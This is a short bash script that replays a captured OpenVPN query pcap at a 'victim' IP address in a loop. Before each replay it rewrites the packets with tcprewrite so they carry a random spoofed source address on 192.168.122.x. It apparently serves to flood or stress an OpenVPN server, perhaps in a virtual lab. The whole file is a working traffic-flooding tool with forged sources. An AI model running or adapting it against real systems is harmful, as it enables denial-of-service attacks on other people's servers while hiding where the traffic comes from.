#!/bin/bash

VICTIM="$1" # Victim IP address
LOOPS="$2"
TEMP_DIR="$3"

tcpprep -a server -o openvpn.cach -i openvpn-querry.pcapng

while [ $LOOPS -gt 0 ]
do
    IP=$(echo $((RANDOM%254 + 1)))
    tcprewrite \
	    --endpoints="$VICTIM":"192.168.122.$IP"\
	    --enet-smac=52:54:00:2d:4c:c4,52:54:00:a9:3f:df \
	    --enet-dmac=52:54:00:a9:3f:df,52:54:00:2d:4c:c4 \
	    -c openvpn.cach -i openvpn-querry.pcapng \
	    -o $TEMP_DIR/openvpn.$BASHPID.pcapng --dlt=enet

    tcpreplay \
	    -K -i eth0 -I eth0 \
	    -c openvpn.cach $TEMP_DIR/openvpn.$BASHPID.pcapng

    LOOPS=$(( $LOOPS - 1 ))
done
